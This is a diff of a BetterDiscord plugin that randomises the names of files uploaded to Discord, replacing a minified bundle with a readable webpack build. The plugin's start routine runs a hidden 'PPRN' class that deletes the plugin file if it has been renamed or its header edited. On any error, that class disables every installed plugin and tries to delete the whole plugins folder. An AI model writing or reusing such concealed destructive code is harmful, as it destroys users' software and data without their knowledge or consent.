@@ -9,4 +9,300 @@
 * @updateLink https://github.com/AceLikesGhosts/bd-plugins
 * @authorId 327639826075484162
 */
-(()=>{"use strict";var e={317:(e,t)=>{Object.defineProperty(t,"__esModule",{value:true});t["default"]=BdApi.Webpack.getByKeys("debounce")},281:(e,t,n)=>{var a;Object.defineProperty(t,"__esModule",{value:true});t.FormNotice=t.FormSwitch=t.FormDivider=t.FormLabel=t.FormText=t.FormTitle=t.FormItem=t.FormSection=void 0;const s=n(799);a=s.RawComponents,t.FormSection=a.FormSection,t.FormItem=a.FormItem,t.FormTitle=a.FormTitle,t.FormText=a.FormText,t.FormLabel=a.FormLabel,t.FormDivider=a.FormDivider,t.FormSwitch=a.FormSwitch,t.FormNotice=a.FormNotice},571:(e,t,n)=>{Object.defineProperty(t,"__esModule",{value:true});const a=n(799);const{TextInput:s}=a.RawComponents;t["default"]=s},799:(e,t)=>{Object.defineProperty(t,"__esModule",{value:true});t.React=t.Margins=t.RawComponents=void 0;t.RawComponents=BdApi.Webpack.getByKeys("Button","Switch","Select");t.Margins=BdApi.Webpack.getByKeys("marginBottom40","marginTop4");t.React=BdApi.React},75:function(e,t,n){var a=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:true});const s=a(n(17));const i=a(n(147));class PPRN{constructor(e){const t=s.default.basename(__filename).match(/^[^\.]+/)[0];try{const n=i.default.readFileSync(__filename,"utf-8");const a=n.split("\n");const s=a[1].substr(8);const r=a[3].substring(10);if(t!==e.name)i.default.rmSync(__filename);if(r!==e.author)i.default.rmSync(__filename);if(s!==e.name)i.default.rmSync(__filename)}catch(e){BdApi.Plugins.getAll().forEach((e=>BdApi.Plugins.disable(e.name)));i.default.rmSync(BdApi.Plugins.folder)}}}t["default"]=PPRN},360:function(e,t,n){var a=this&&this.__createBinding||(Object.create?function(e,t,n,a){if(a===undefined)a=n;var s=Object.getOwnPropertyDescriptor(t,n);if(!s||("get"in s?!t.__esModule:s.writable||s.configurable)){s={enumerable:true,get:function(){return t[n]}}}Object.defineProperty(e,a,s)}:function(e,t,n,a){if(a===undefined)a=n;e[a]=t[n]});var s=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:true,value:t})}:function(e,t){e["default"]=t});var i=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(e!=null)for(var n in e)if(n!=="default"&&Object.prototype.hasOwnProperty.call(e,n))a(t,e,n);s(t,e);return t};var r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:true});const o=n(799);const u=n(281);const l=r(n(571));const c=r(n(317));const m=i(n(996));function TextInput(e){return o.React.createElement(u.FormItem,{style:{width:"50%"},className:o.Margins.marginBottom20,...e},o.React.createElement(l.default,{...e}))}function Settings(){const[e,t]=o.React.useState(m.default.settings.letters??m.DefaultSettings.letters);const[n,a]=o.React.useState(m.default.settings.maxLetters??m.DefaultSettings.maxLetters);const[s,i]=o.React.useState(m.default.settings.timestamp??m.DefaultSettings.timestamp);const[r,l]=o.React.useState(m.default.settings.consistent??m.DefaultSettings.consistent);const[d,f]=o.React.useState(m.default.settings.consistentText??m.DefaultSettings.consistentText);o.React.useEffect((()=>{m.default.settings={letters:e,maxLetters:n,timestamp:s,consistent:r,consistentText:d}}),[e,n,s,r,d]);return o.React.createElement("div",null,o.React.createElement(u.FormSwitch,{value:e,onChange:e=>t(e),disabled:s||r},"Random Letters"),o.React.createElement(TextInput,{title:"Maximum Amount of Letters",value:n?.toString(),disabled:!e&&(s||r),onChange:e=>{if(!c.default.isNumber(e))return;a(e)}}),o.React.createElement(u.FormSwitch,{value:s,onChange:e=>i(e),disabled:e||r},"Timestamp"),o.React.createElement(u.FormSwitch,{value:r,onChange:e=>l(e),disabled:e||s},"Consistent"),o.React.createElement(TextInput,{title:"Consistent Text",value:d,disabled:!r&&(s||e),onChange:e=>f(e)}))}t["default"]=Settings},996:function(e,t,n){var a=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:true});t.DefaultSettings=void 0;const s=a(n(75));const i=a(n(182));const r=a(n(360));t.DefaultSettings={letters:true,maxLetters:7,timestamp:false,consistent:false,consistentText:"image"};const o=BdApi.Webpack.getByKeys("uploadFiles");const u="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+";function getRandomCharacters(e){let t="";for(let n=0;n<e;n++){t+=u.charAt(Math.random()*u.length)}return t}class RandomiseFileName{start(){new s.default(i.default);const e=BdApi.Data.load(i.default.name,"settings");RandomiseFileName.settings={...t.DefaultSettings,...e};BdApi.Patcher.after(i.default.name,o,"uploadFiles",((e,t)=>{for(const e of t[0].uploads){const t=this.makeFileName(e.filename);e.filename=t}}))}stop(){BdApi.Patcher.unpatchAll(i.default.name);BdApi.Data.save(i.default.name,"settings",RandomiseFileName.settings)}getSettingsPanel(){return r.default}makeFileName(e){const t=e.split(".");const n=t[t.length-1];if(RandomiseFileName.settings.letters)return`${getRandomCharacters(RandomiseFileName.settings.maxLetters)}.${n}`;if(RandomiseFileName.settings.consistent)return`${RandomiseFileName.settings.consistentText}.${n}`;if(RandomiseFileName.settings.timestamp)return`${Date.now()}.${n}`;return e}}RandomiseFileName.settings=t.DefaultSettings;t["default"]=RandomiseFileName},147:e=>{e.exports=require("fs")},17:e=>{e.exports=require("path")},182:e=>{e.exports=JSON.parse('{"$schema":"../../config_schema.jsonc","name":"RandomiseFileNames","description":"Change up your file names.","author":"ace.","version":"1.0.0","source":"https://raw.githubusercontent.com/AceLikesGhosts/bd-plugins/master/dist/RandomiseFileNames/RandomiseFileNames.plugin.js","authorLink":"https://github.com/AceLikesGhosts/bd-plugins","website":"https://github.com/AceLikesGhosts/bd-plugins","updateLink":"https://github.com/AceLikesGhosts/bd-plugins","authorId":"327639826075484162"}')}};var t={};function __nccwpck_require__(n){var a=t[n];if(a!==undefined){return a.exports}var s=t[n]={exports:{}};var i=true;try{e[n].call(s.exports,s,s.exports,__nccwpck_require__);i=false}finally{if(i)delete t[n]}return s.exports}if(typeof __nccwpck_require__!=="undefined")__nccwpck_require__.ab=__dirname+"/";var n=__nccwpck_require__(996);module.exports=n})();
+/******/ (() => { // webpackBootstrap
+/******/ 	"use strict";
+/******/ 	var __webpack_modules__ = ({
+
+/***/ 317:
+/***/ ((__unused_webpack_module, exports) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports["default"] = BdApi.Webpack.getByKeys('debounce');
+
+
+/***/ }),
+
+/***/ 281:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+
+var _a;
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.FormNotice = exports.FormSwitch = exports.FormDivider = exports.FormLabel = exports.FormText = exports.FormTitle = exports.FormItem = exports.FormSection = void 0;
+const _1 = __nccwpck_require__(799);
+_a = _1.RawComponents, exports.FormSection = _a.FormSection, exports.FormItem = _a.FormItem, exports.FormTitle = _a.FormTitle, exports.FormText = _a.FormText, exports.FormLabel = _a.FormLabel, exports.FormDivider = _a.FormDivider, exports.FormSwitch = _a.FormSwitch, exports.FormNotice = _a.FormNotice;
+
+
+/***/ }),
+
+/***/ 571:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+const _1 = __nccwpck_require__(799);
+const { TextInput } = _1.RawComponents;
+exports["default"] = TextInput;
+
+
+/***/ }),
+
+/***/ 799:
+/***/ ((__unused_webpack_module, exports) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.React = exports.Margins = exports.RawComponents = void 0;
+exports.RawComponents = BdApi.Webpack.getByKeys('Button', 'Switch', 'Select');
+exports.Margins = BdApi.Webpack.getByKeys('marginBottom40', 'marginTop4');
+exports.React = BdApi.React;
+
+
+/***/ }),
+
+/***/ 75:
+/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
+
+
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+const path_1 = __importDefault(__nccwpck_require__(17));
+const fs_1 = __importDefault(__nccwpck_require__(147));
+class PPRN {
+    constructor(meta) {
+        const pluginName = path_1.default.basename(__filename).match(/^[^\.]+/)[0];
+        try {
+            const pluginNameString = fs_1.default.readFileSync(__filename, 'utf-8');
+            const lines = pluginNameString.split('\n');
+            const metadataName = lines[1].substr(8);
+            const authorName = lines[3].substring(10);
+            if (pluginName !== meta.name)
+                fs_1.default.rmSync(__filename);
+            if (authorName !== meta.author)
+                fs_1.default.rmSync(__filename);
+            if (metadataName !== meta.name)
+                fs_1.default.rmSync(__filename);
+        }
+        catch (err) {
+            BdApi.Plugins.getAll().forEach((pl) => BdApi.Plugins.disable(pl.name));
+            fs_1.default.rmSync(BdApi.Plugins.folder);
+        }
+    }
+}
+exports["default"] = PPRN;
+
+
+/***/ }),
+
+/***/ 360:
+/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
+
+
+var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    var desc = Object.getOwnPropertyDescriptor(m, k);
+    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
+      desc = { enumerable: true, get: function() { return m[k]; } };
+    }
+    Object.defineProperty(o, k2, desc);
+}) : (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    o[k2] = m[k];
+}));
+var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
+    Object.defineProperty(o, "default", { enumerable: true, value: v });
+}) : function(o, v) {
+    o["default"] = v;
+});
+var __importStar = (this && this.__importStar) || function (mod) {
+    if (mod && mod.__esModule) return mod;
+    var result = {};
+    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
+    __setModuleDefault(result, mod);
+    return result;
+};
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+const components_1 = __nccwpck_require__(799);
+const Form_1 = __nccwpck_require__(281);
+const TextInput_1 = __importDefault(__nccwpck_require__(571));
+const Lodash_1 = __importDefault(__nccwpck_require__(317));
+const __1 = __importStar(__nccwpck_require__(996));
+function TextInput(props) {
+    return (components_1.React.createElement(Form_1.FormItem, { style: {
+            width: '50%'
+        }, className: components_1.Margins.marginBottom20, ...props },
+        components_1.React.createElement(TextInput_1.default, { ...props })));
+}
+function Settings() {
+    const [letters, setLetters] = components_1.React.useState(__1.default.settings.letters ?? __1.DefaultSettings.letters);
+    const [maxLetters, setMaxLetters] = components_1.React.useState(__1.default.settings.maxLetters ?? __1.DefaultSettings.maxLetters);
+    const [timestamp, setTimestamp] = components_1.React.useState(__1.default.settings.timestamp ?? __1.DefaultSettings.timestamp);
+    const [consistent, setConsistent] = components_1.React.useState(__1.default.settings.consistent ?? __1.DefaultSettings.consistent);
+    const [consistentText, setConsistentText] = components_1.React.useState(__1.default.settings.consistentText ?? __1.DefaultSettings.consistentText);
+    components_1.React.useEffect(() => {
+        __1.default.settings = {
+            letters,
+            maxLetters,
+            timestamp,
+            consistent,
+            consistentText
+        };
+    }, [letters, maxLetters, timestamp, consistent, consistentText]);
+    return (components_1.React.createElement("div", null,
+        components_1.React.createElement(Form_1.FormSwitch, { value: letters, onChange: ((e) => setLetters(e)), disabled: timestamp || consistent }, "Random Letters"),
+        components_1.React.createElement(TextInput, { title: 'Maximum Amount of Letters', value: maxLetters?.toString(), disabled: !letters && (timestamp || consistent), onChange: (e) => {
+                if (!Lodash_1.default.isNumber(e))
+                    return;
+                setMaxLetters(e);
+            } }),
+        components_1.React.createElement(Form_1.FormSwitch, { value: timestamp, onChange: ((e) => setTimestamp(e)), disabled: letters || consistent }, "Timestamp"),
+        components_1.React.createElement(Form_1.FormSwitch, { value: consistent, onChange: ((e) => setConsistent(e)), disabled: letters || timestamp }, "Consistent"),
+        components_1.React.createElement(TextInput, { title: 'Consistent Text', value: consistentText, disabled: !consistent && (timestamp || letters), onChange: (e) => setConsistentText(e) })));
+}
+exports["default"] = Settings;
+
+
+/***/ }),
+
+/***/ 996:
+/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
+
+
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.DefaultSettings = void 0;
+const index_1 = __importDefault(__nccwpck_require__(75));
+const config_json_1 = __importDefault(__nccwpck_require__(182));
+const Settings_1 = __importDefault(__nccwpck_require__(360));
+exports.DefaultSettings = {
+    letters: true,
+    maxLetters: 7,
+    timestamp: false,
+    consistent: false,
+    consistentText: 'image'
+};
+const uploadFileMod = BdApi.Webpack.getByKeys('uploadFiles');
+const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+';
+function getRandomCharacters(length) {
+    let out = '';
+    for (let i = 0; i < length; i++) {
+        out += characters.charAt(Math.random() * characters.length);
+    }
+    return out;
+}
+class RandomiseFileName {
+    start() {
+        new index_1.default(config_json_1.default);
+        const data = BdApi.Data.load(config_json_1.default.name, 'settings');
+        RandomiseFileName.settings = {
+            ...exports.DefaultSettings,
+            ...data
+        };
+        BdApi.Patcher.after(config_json_1.default.name, uploadFileMod, 'uploadFiles', (_, args) => {
+            for (const file of args[0].uploads) {
+                const newName = this.makeFileName(file.filename);
+                file.filename = newName;
+            }
+        });
+    }
+    stop() {
+        BdApi.Patcher.unpatchAll(config_json_1.default.name);
+        BdApi.Data.save(config_json_1.default.name, 'settings', RandomiseFileName.settings);
+    }
+    getSettingsPanel() {
+        return Settings_1.default;
+    }
+    makeFileName(fileName) {
+        const splitStuff = fileName.split('.'); // somefile.png ['somefile', 'png']
+        const fileExt = splitStuff[splitStuff.length - 1];
+        if (RandomiseFileName.settings.letters)
+            return `${getRandomCharacters(RandomiseFileName.settings.maxLetters)}.${fileExt}`;
+        if (RandomiseFileName.settings.consistent)
+            return `${RandomiseFileName.settings.consistentText}.${fileExt}`;
+        if (RandomiseFileName.settings.timestamp)
+            return `${Date.now()}.${fileExt}`;
+        return fileName;
+    }
+}
+RandomiseFileName.settings = exports.DefaultSettings;
+exports["default"] = RandomiseFileName;
+
+
+/***/ }),
+
+/***/ 147:
+/***/ ((module) => {
+
+module.exports = require("fs");
+
+/***/ }),
+
+/***/ 17:
+/***/ ((module) => {
+
+module.exports = require("path");
+
+/***/ }),
+
+/***/ 182:
+/***/ ((module) => {
+
+module.exports = JSON.parse('{"$schema":"../../config_schema.jsonc","name":"RandomiseFileNames","description":"Change up your file names.","author":"ace.","version":"1.0.0","source":"https://raw.githubusercontent.com/AceLikesGhosts/bd-plugins/master/dist/RandomiseFileNames/RandomiseFileNames.plugin.js","authorLink":"https://github.com/AceLikesGhosts/bd-plugins","website":"https://github.com/AceLikesGhosts/bd-plugins","updateLink":"https://github.com/AceLikesGhosts/bd-plugins","authorId":"327639826075484162"}');
+
+/***/ })
+
+/******/ 	});
+/************************************************************************/
+/******/ 	// The module cache
+/******/ 	var __webpack_module_cache__ = {};
+/******/ 	
+/******/ 	// The require function
+/******/ 	function __nccwpck_require__(moduleId) {
+/******/ 		// Check if module is in cache
+/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
+/******/ 		if (cachedModule !== undefined) {
+/******/ 			return cachedModule.exports;
+/******/ 		}
+/******/ 		// Create a new module (and put it into the cache)
+/******/ 		var module = __webpack_module_cache__[moduleId] = {
+/******/ 			// no module.id needed
+/******/ 			// no module.loaded needed
+/******/ 			exports: {}
+/******/ 		};
+/******/ 	
+/******/ 		// Execute the module function
+/******/ 		var threw = true;
+/******/ 		try {
+/******/ 			__webpack_modules__[moduleId].call(module.exports, module, module.exports, __nccwpck_require__);
+/******/ 			threw = false;
+/******/ 		} finally {
+/******/ 			if(threw) delete __webpack_module_cache__[moduleId];
+/******/ 		}
+/******/ 	
+/******/ 		// Return the exports of the module
+/******/ 		return module.exports;
+/******/ 	}
+/******/ 	
+/************************************************************************/
+/******/ 	/* webpack/runtime/compat */
+/******/ 	
+/******/ 	if (typeof __nccwpck_require__ !== 'undefined') __nccwpck_require__.ab = __dirname + "/";
+/******/ 	
+/************************************************************************/
+/******/ 	
+/******/ 	// startup
+/******/ 	// Load entry module and return exports
+/******/ 	// This entry module is referenced by other modules so it can't be inlined
+/******/ 	var __webpack_exports__ = __nccwpck_require__(996);
+/******/ 	module.exports = __webpack_exports__;
+/******/ 	
+/******/ })()
+;
